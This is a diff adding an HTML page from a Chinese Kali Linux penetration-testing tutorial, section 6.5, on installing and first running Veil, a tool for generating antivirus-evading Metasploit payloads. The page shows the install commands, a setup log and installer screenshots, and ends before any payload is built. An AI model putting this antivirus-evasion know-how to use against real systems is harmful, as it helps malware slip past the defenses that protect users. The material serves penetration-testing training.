@@ -1,0 +1,1439 @@
+<!DOCTYPE HTML>
+<html lang="zh-tw" >
+    
+    <head>
+        
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <title>6.5 免杀Payload生成工具Veil | 大学霸 Kali Linux 安全渗透教程</title>
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 2.6.7">
+        <meta name="author" content="wizardforcel">
+        
+        <meta name="HandheldFriendly" content="true"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+        <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+        
+    <link rel="stylesheet" href="gitbook/style.css">
+    
+        
+        <link rel="stylesheet" href="gitbook/plugins/gitbook-plugin-comment/plugin.css">
+        
+    
+        
+        <link rel="stylesheet" href="gitbook/plugins/gitbook-plugin-highlight/website.css">
+        
+    
+        
+        <link rel="stylesheet" href="gitbook/plugins/gitbook-plugin-search/search.css">
+        
+    
+        
+        <link rel="stylesheet" href="gitbook/plugins/gitbook-plugin-fontsettings/website.css">
+        
+    
+    
+
+        
+    
+    
+    <link rel="next" href="./35.html" />
+    
+    
+    <link rel="prev" href="./33.html" />
+    
+
+        
+    </head>
+    <body>
+        
+        
+    <div class="book"
+        data-level="6.5"
+        data-chapter-title="6.5 免杀Payload生成工具Veil"
+        data-filepath="34.md"
+        data-basepath="."
+        data-revision="Mon Mar 07 2016 07:10:02 GMT+0000 (UTC)"
+        data-innerlanguage="">
+    
+
+<div class="book-summary">
+    <nav role="navigation">
+        <ul class="summary">
+            
+            
+            
+                
+                <li>
+                    <a href="https://www.gitbook.com/book/wizardforcel/daxueba-kali-linux-tutorial" target="blank" class="custom-link">大学霸 Kali Linux 安全渗透教程</a>
+                </li>
+            
+            
+
+            
+            <li class="divider"></li>
+            
+
+            
+    
+        <li class="chapter " data-level="0" data-path="index.html">
+            
+                
+                    <a href="./index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                        介紹
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1" data-path="0.html">
+            
+                
+                    <a href="./0.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.</b>
+                        
+                        第1章　Linux安全渗透简介
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.1" data-path="1.html">
+            
+                
+                    <a href="./1.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.1.</b>
+                        
+                        1.1 什么是安全渗透
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="2.html">
+            
+                
+                    <a href="./2.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.2.</b>
+                        
+                        1.2 安全渗透所需的工具
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="3.html">
+            
+                
+                    <a href="./3.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.3.</b>
+                        
+                        1.3 Kali Linux简介
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="4.html">
+            
+                
+                    <a href="./4.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.4.</b>
+                        
+                        1.4 安装Kali Linux
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="5.html">
+            
+                
+                    <a href="./5.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.5.</b>
+                        
+                        1.5 Kali更新与升级
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="6.html">
+            
+                
+                    <a href="./6.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.6.</b>
+                        
+                        1.6 基本设置
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2" data-path="7.html">
+            
+                
+                    <a href="./7.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.</b>
+                        
+                        第2章　配置Kali Linux
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1" data-path="8.html">
+            
+                
+                    <a href="./8.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.1.</b>
+                        
+                        2.1 准备内核头文件
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="9.html">
+            
+                
+                    <a href="./9.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.2.</b>
+                        
+                        2.2 安装并配置NVIDIA显卡驱动
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="10.html">
+            
+                
+                    <a href="./10.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.3.</b>
+                        
+                        2.3 应用更新和配置额外安全工具
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="11.html">
+            
+                
+                    <a href="./11.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.4.</b>
+                        
+                        2.4 设置ProxyChains
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5" data-path="12.html">
+            
+                
+                    <a href="./12.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.5.</b>
+                        
+                        2.5 目录加密
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3" data-path="13.html">
+            
+                
+                    <a href="./13.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.</b>
+                        
+                        第3章　高级测试实验室
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.1" data-path="14.html">
+            
+                
+                    <a href="./14.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.1.</b>
+                        
+                        3.1 使用VMware Workstation
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" data-path="15.html">
+            
+                
+                    <a href="./15.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.2.</b>
+                        
+                        3.2 攻击WordPress和其他应用程序
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="4" data-path="16.html">
+            
+                
+                    <a href="./16.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.</b>
+                        
+                        第4章　信息收集
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.1" data-path="17.html">
+            
+                
+                    <a href="./17.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.1.</b>
+                        
+                        4.1 枚举服务
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2" data-path="18.html">
+            
+                
+                    <a href="./18.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.2.</b>
+                        
+                        4.2 测试网络范围
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.3" data-path="19.html">
+            
+                
+                    <a href="./19.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.3.</b>
+                        
+                        4.3 识别活跃的主机
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.4" data-path="20.html">
+            
+                
+                    <a href="./20.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.4.</b>
+                        
+                        4.4 查看打开的端口
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.5" data-path="21.html">
+            
+                
+                    <a href="./21.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.5.</b>
+                        
+                        4.5 系统指纹识别
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.6" data-path="22.html">
+            
+                
+                    <a href="./22.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.6.</b>
+                        
+                        4.6 服务的指纹识别
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.7" data-path="23.html">
+            
+                
+                    <a href="./23.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.7.</b>
+                        
+                        4.7 其他信息收集手段
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.8" data-path="24.html">
+            
+                
+                    <a href="./24.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.8.</b>
+                        
+                        4.8 使用Maltego收集信息
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.9" data-path="25.html">
+            
+                
+                    <a href="./25.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.9.</b>
+                        
+                        4.9 绘制网络结构图
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="5" data-path="26.html">
+            
+                
+                    <a href="./26.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.</b>
+                        
+                        第5章　漏洞扫描
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="5.1" data-path="27.html">
+            
+                
+                    <a href="./27.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.1.</b>
+                        
+                        5.1 使用Nessus
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2" data-path="28.html">
+            
+                
+                    <a href="./28.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.</b>
+                        
+                        5.2 使用OpenVAS
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="6" data-path="29.html">
+            
+                
+                    <a href="./29.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.</b>
+                        
+                        第6章　漏洞利用
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="6.1" data-path="30.html">
+            
+                
+                    <a href="./30.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.1.</b>
+                        
+                        6.1 Metasploitable操作系统
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="6.2" data-path="31.html">
+            
+                
+                    <a href="./31.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.2.</b>
+                        
+                        6.2 Metasploit基础
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="6.3" data-path="32.html">
+            
+                
+                    <a href="./32.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.3.</b>
+                        
+                        6.3 控制Meterpreter
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="6.4" data-path="33.html">
+            
+                
+                    <a href="./33.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.4.</b>
+                        
+                        6.4 渗透攻击应用
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter active" data-level="6.5" data-path="34.html">
+            
+                
+                    <a href="./34.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.5.</b>
+                        
+                        6.5 免杀Payload生成工具Veil
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="7" data-path="35.html">
+            
+                
+                    <a href="./35.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>7.</b>
+                        
+                        第7章　权限提升
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="7.1" data-path="36.html">
+            
+                
+                    <a href="./36.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>7.1.</b>
+                        
+                        7.1 使用假冒令牌
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="7.2" data-path="37.html">
+            
+                
+                    <a href="./37.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>7.2.</b>
+                        
+                        7.2 本地权限提升
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="7.3" data-path="38.html">
+            
+                
+                    <a href="./38.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>7.3.</b>
+                        
+                        7.3 使用社会工程学工具包（SET）
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="7.4" data-path="39.html">
+            
+                
+                    <a href="./39.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>7.4.</b>
+                        
+                        7.4 使用SET实施攻击
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="8" data-path="40.html">
+            
+                
+                    <a href="./40.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>8.</b>
+                        
+                        第8章　密码攻击
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="8.1" data-path="41.html">
+            
+                
+                    <a href="./41.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>8.1.</b>
+                        
+                        8.1 密码在线破解
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="8.2" data-path="42.html">
+            
+                
+                    <a href="./42.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>8.2.</b>
+                        
+                        8.2 分析密码
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="8.3" data-path="43.html">
+            
+                
+                    <a href="./43.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>8.3.</b>
+                        
+                        8.3 破解LM Hashes密码
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="8.4" data-path="44.html">
+            
+                
+                    <a href="./44.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>8.4.</b>
+                        
+                        8.4 绕过Utilman登录
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="8.5" data-path="45.html">
+            
+                
+                    <a href="./45.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>8.5.</b>
+                        
+                        8.5 破解纯文本密码工具mimikatz
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="8.6" data-path="46.html">
+            
+                
+                    <a href="./46.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>8.6.</b>
+                        
+                        8.6 破解操作系统用户密码
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="8.7" data-path="47.html">
+            
+                
+                    <a href="./47.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>8.7.</b>
+                        
+                        8.7 创建密码字典
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="8.8" data-path="48.html">
+            
+                
+                    <a href="./48.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>8.8.</b>
+                        
+                        8.8 使用NVIDIA计算机统一设备架构（CUDA）
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="8.9" data-path="49.html">
+            
+                
+                    <a href="./49.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>8.9.</b>
+                        
+                        8.9 物理访问攻击
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="9" data-path="50.html">
+            
+                
+                    <a href="./50.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>9.</b>
+                        
+                        第9章　无线网络渗透测试
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="9.1" data-path="51.html">
+            
+                
+                    <a href="./51.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>9.1.</b>
+                        
+                        9.1 无线网络嗅探工具Kismet
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="9.2" data-path="52.html">
+            
+                
+                    <a href="./52.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>9.2.</b>
+                        
+                        9.2 使用Aircrack-ng工具破解无线网络
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="9.3" data-path="53.html">
+            
+                
+                    <a href="./53.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>9.3.</b>
+                        
+                        9.3 Gerix Wifi Cracker破解无线网络
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="9.4" data-path="54.html">
+            
+                
+                    <a href="./54.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>9.4.</b>
+                        
+                        9.4 使用Wifite破解无线网络
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="9.5" data-path="55.html">
+            
+                
+                    <a href="./55.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>9.5.</b>
+                        
+                        9.5 使用Easy-Creds工具攻击无线网络
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="9.6" data-path="56.html">
+            
+                
+                    <a href="./56.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>9.6.</b>
+                        
+                        9.6 在树莓派上破解无线网络
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="9.7" data-path="57.html">
+            
+                
+                    <a href="./57.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>9.7.</b>
+                        
+                        9.7 攻击路由器
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="9.8" data-path="58.html">
+            
+                
+                    <a href="./58.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>9.8.</b>
+                        
+                        9.8 Arpspoof工具
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+
+            
+            <li class="divider"></li>
+            <li>
+                <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+                    本書使用 GitBook 釋出
+                </a>
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+
+    <div class="book-body">
+        <div class="body-inner">
+            <div class="book-header" role="navigation">
+    <!-- Actions Left -->
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="./" >大学霸 Kali Linux 安全渗透教程</a>
+    </h1>
+</div>
+
+            <div class="page-wrapper" tabindex="-1" role="main">
+                <div class="page-inner">
+                
+                
+                    <section class="normal" id="section-">
+                    
+                        <h2 id="65-&#x514D;&#x6740;payload&#x751F;&#x6210;&#x5DE5;&#x5177;veil">6.5 &#x514D;&#x6740;Payload&#x751F;&#x6210;&#x5DE5;&#x5177;Veil</h2>
+<p>Veil&#x662F;&#x4E00;&#x6B3E;&#x5229;&#x7528;Metasploit&#x6846;&#x67B6;&#x751F;&#x6210;&#x76F8;&#x517C;&#x5BB9;&#x7684;Payload&#x5DE5;&#x5177;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x5927;&#x591A;&#x6570;&#x7F51;&#x7EDC;&#x73AF;&#x5883;&#x4E2D;&#x80FD;&#x7ED5;&#x8FC7;&#x5E38;&#x89C1;&#x7684;&#x6740;&#x6BD2;&#x8F6F;&#x4EF6;&#x3002;&#x672C;&#x8282;&#x5C06;&#x4ECB;&#x7ECD;Veil&#x5DE5;&#x5177;&#x7684;&#x5B89;&#x88C5;&#x53CA;&#x4F7F;&#x7528;&#x3002;</p>
+<p>&#x5728;Kali Linux&#x4E2D;&#xFF0C;&#x9ED8;&#x8BA4;&#x6CA1;&#x6709;&#x5B89;&#x88C5;Veil&#x5DE5;&#x5177;&#x3002;&#x8FD9;&#x91CC;&#x9996;&#x5148;&#x5B89;&#x88C5;Veil&#x5DE5;&#x5177;&#xFF0C;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x7684;&#x547D;&#x4EE4;&#xFF1A;</p>
+<pre><code>root@kali:~# apt-get install veil
+</code></pre><p>&#x6267;&#x884C;&#x4EE5;&#x4E0A;&#x547D;&#x4EE4;&#x540E;&#xFF0C;&#x5982;&#x679C;&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#x6CA1;&#x6709;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x7684;&#x8BDD;&#xFF0C;&#x5219;&#x8868;&#x793A;Veil&#x5DE5;&#x5177;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x3002;&#x7531;&#x4E8E;&#x5B89;&#x88C5;&#x8BE5;&#x5DE5;&#x5177;&#x4F9D;&#x8D56;&#x7684;&#x8F6F;&#x4EF6;&#x8F83;&#x591A;&#xFF0C;&#x6240;&#x4EE5;&#x6B64;&#x8FC7;&#x7A0B;&#x65F6;&#x95F4;&#x6709;&#x70B9;&#x957F;&#x3002;</p>
+<p>&#x542F;&#x52A8;Veil&#x5DE5;&#x5177;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>root@kali:~# veil-evasion
+</code></pre><p>&#x6267;&#x884C;&#x4EE5;&#x4E0A;&#x547D;&#x4EE4;&#x540E;&#xFF0C;&#x5C06;&#x4F1A;&#x8F93;&#x51FA;&#x5927;&#x91CF;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>===============================================
+ Veil First Run Detected&#x2026; Initializing Script Setup&#x2026;
+===============================================
+[*] Executing ./setup/setup.sh
+===============================================
+ Veil-Evasion Setup Script | [Updated]: 01.15.2015
+===============================================
+ [Web]: https://www.veil-framework.com | [Twitter]: @VeilFramework
+===============================================
+[*] Initializing Apt Dependencies Installation
+[*] Adding i386 Architecture To x86_64 System
+[*] Updating Apt Package Lists
+&#x547D;&#x4E2D; http://mirrors.ustc.edu.cn kali Release.gpg
+&#x547D;&#x4E2D; http://mirrors.ustc.edu.cn kali/updates Release.gpg
+&#x547D;&#x4E2D; http://mirrors.ustc.edu.cn kali Release
+&#x547D;&#x4E2D; http://mirrors.ustc.edu.cn kali/updates Release
+&#x547D;&#x4E2D; http://mirrors.ustc.edu.cn kali/main Sources
+&#x547D;&#x4E2D; http://mirrors.ustc.edu.cn kali/non-free Sources
+&#x547D;&#x4E2D; http://mirrors.ustc.edu.cn kali/contrib Sources
+&#x547D;&#x4E2D; http://mirrors.ustc.edu.cn kali/main amd64 Packages
+&#x547D;&#x4E2D; http://mirrors.ustc.edu.cn kali/non-free amd64 Packages
+&#x547D;&#x4E2D; http://mirrors.ustc.edu.cn kali/contrib amd64 Packages
+&#x83B7;&#x53D6;&#xFF1A;1 http://mirrors.ustc.edu.cn kali/main i386 Packages [8,474 kB]
+&#x547D;&#x4E2D; http://http.kali.org kali Release.gpg
+&#x547D;&#x4E2D; http://security.kali.org kali/updates Release.gpg
+&#x547D;&#x4E2D; http://http.kali.org kali Release
+&#x2026;&#x2026;
+&#x5FFD;&#x7565; http://http.kali.org kali/non-free Translation-en
+&#x4E0B;&#x8F7D; 17.8 MB&#xFF0C;&#x8017;&#x65F6; 20&#x79D2; (859 kB/s)
+&#x6B63;&#x5728;&#x8BFB;&#x53D6;&#x8F6F;&#x4EF6;&#x5305;&#x5217;&#x8868;&#x2026; &#x5B8C;&#x6210;
+ [*] Installing Wine i386 Binaries
+&#x6B63;&#x5728;&#x8BFB;&#x53D6;&#x8F6F;&#x4EF6;&#x5305;&#x5217;&#x8868;&#x2026; &#x5B8C;&#x6210;
+&#x6B63;&#x5728;&#x5206;&#x6790;&#x8F6F;&#x4EF6;&#x5305;&#x7684;&#x4F9D;&#x8D56;&#x5173;&#x7CFB;&#x6811;
+&#x6B63;&#x5728;&#x8BFB;&#x53D6;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#x2026; &#x5B8C;&#x6210;
+&#x5C06;&#x4F1A;&#x5B89;&#x88C5;&#x4E0B;&#x5217;&#x989D;&#x5916;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#xFF1A;
+ gcc-4.7-base:i386 libasound2:i386 libc-bin libc-dev-bin libc6 libc6:i386
+ libc6-dev libc6-i686:i386 libdbus-1-3:i386 libdrm-intel1:i386
+ libdrm-nouveau1a:i386 libdrm-radeon1:i386 libdrm2:i386 libexpat1:i386
+ libffi5:i386 libfontconfig1:i386 libfreetype6:i386 libgcc1:i386
+[*] Cleaning Up Setup Files
+[*] Updating Veil-Framework Configuration
+ Veil-Framework configuration:
+ [*] OPERATING_SYSTEM = Kali
+ [*] TERMINAL_CLEAR = clear
+ [*] TEMP_DIR = /tmp/
+ [*] MSFVENOM_OPTIONS =
+ [*] METASPLOIT_PATH = /usr/share/metasploit-framework/
+ [*] PYINSTALLER_PATH = /usr/share/pyinstaller/
+[*] VEIL_EVASION_PATH = /usr/share/veil-evasion/
+ [*] PAYLOAD_SOURCE_PATH = /root/veil-output/source/
+ [*] Path &apos;/root/veil-output/source/&apos; Created
+ [*] PAYLOAD_COMPILED_PATH = /root/veil-output/compiled/
+ [*] Path &apos;/root/veil-output/compiled/&apos; Created
+ [*] Path &apos;/root/veil-output/handlers/&apos; Created
+ [*] GENERATE_HANDLER_SCRIPT = True
+ [*] HANDLER_PATH = /root/veil-output/handlers/
+ [*] HASH_LIST = /root/veil-output/hashes.txt
+[*] VEIL_CATAPULT_PATH = /usr/share/Veil-Catapult/
+ [*] Path &apos;/root/veil-output/catapult/&apos; Created
+ [*] CATAPULT_RESOURCE_PATH = /root/veil-output/catapult/
+[*] Path &apos;/etc/veil/&apos; Created
+ Configuration File Written To &apos;/etc/veil/settings.py&apos;
+</code></pre><p>&#x4EE5;&#x4E0A;&#x4FE1;&#x606F;&#x53EA;&#x6709;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x8FD0;&#x884C;Veil&#x65F6;&#x624D;&#x663E;&#x793A;&#x3002;&#x5728;&#x6B64;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x521D;&#x59CB;&#x5316;&#x4E00;&#x4E9B;&#x811A;&#x672C;&#x3001;&#x8F6F;&#x4EF6;&#x5305;&#x5217;&#x8868;&#x3001;&#x66F4;&#x65B0;&#x914D;&#x7F6E;&#x53CA;&#x5B89;&#x88C5;&#x9700;&#x8981;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#x3002;&#x5728;&#x6B64;&#x8FC7;&#x7A0B;&#x4E2D;&#x4EE5;&#x56FE;&#x5F62;&#x754C;&#x9762;&#x7684;&#x5F62;&#x5F0F;&#x4F9D;&#x6B21;&#x5B89;&#x88C5;&#x4E86;Python&#x53CA;&#x5B83;&#x7684;&#x4E24;&#x4E2A;&#x6A21;&#x5757;pywin32-218&#x548C;pycrypto-2.6&#x3002;&#x4E0B;&#x9762;&#x4F9D;&#x6B21;&#x8FDB;&#x884C;&#x5B89;&#x88C5;&#x3002;&#x9996;&#x5148;&#x5F39;&#x51FA;&#x7684;&#x5BF9;&#x8BDD;&#x6846;&#xFF0C;&#x5982;&#x56FE;6.32&#x6240;&#x793A;&#x3002;</p>
+<p><img src="img/00321.jpeg" alt="201-01"></p>
+<p>&#x56FE;6.32 Python&#x521D;&#x59CB;&#x754C;&#x9762;</p>
+<p>&#x8BE5;&#x754C;&#x9762;&#x662F;&#x5B89;&#x88C5;Python&#x7684;&#x521D;&#x59CB;&#x754C;&#x9762;&#x3002;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;&#xFF0C;&#x5355;&#x51FB;Next&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x56FE;6.33&#x6240;&#x793A;&#x7684;&#x754C;&#x9762;&#x3002;</p>
+<p><img src="img/00322.jpeg" alt="201-02"></p>
+<p>&#x56FE;6.33 &#x9009;&#x62E9;Python&#x5B89;&#x88C5;&#x4F4D;&#x7F6E;</p>
+<p>&#x5728;&#x8BE5;&#x754C;&#x9762;&#x5355;&#x51FB;Next&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x56FE;6.34&#x6240;&#x793A;&#x7684;&#x754C;&#x9762;&#x3002;&#x8BE5;&#x754C;&#x9762;&#x63D0;&#x793A;C:\Python27&#x5DF2;&#x5B58;&#x5728;&#xFF0C;&#x786E;&#x8BA4;&#x662F;&#x5426;&#x8981;&#x8986;&#x76D6;&#x5DF2;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x8FD9;&#x91CC;&#x5355;&#x51FB;Yes&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x56FE;6.35&#x6240;&#x793A;&#x7684;&#x754C;&#x9762;&#x3002;</p>
+<p><img src="img/00323.jpeg" alt="201-03"></p>
+<p>&#x56FE;6.34 &#x786E;&#x8BA4;Python&#x7684;&#x5B89;&#x88C5;&#x4F4D;&#x7F6E;</p>
+<p><img src="img/00324.jpeg" alt="201-04"></p>
+<p>&#x56FE;6.35 &#x81EA;&#x5B9A;&#x4E49;Python</p>
+<p>&#x5728;&#x8BE5;&#x754C;&#x9762;&#x81EA;&#x5B9A;&#x4E49;&#x5B89;&#x88C5;Python&#x7684;&#x4E00;&#x4E9B;&#x529F;&#x80FD;&#x3002;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x5355;&#x51FB;Next&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x56FE;6.36&#x6240;&#x793A;&#x7684;&#x754C;&#x9762;&#x3002;</p>
+<p><img src="img/00325.jpeg" alt="201-05"></p>
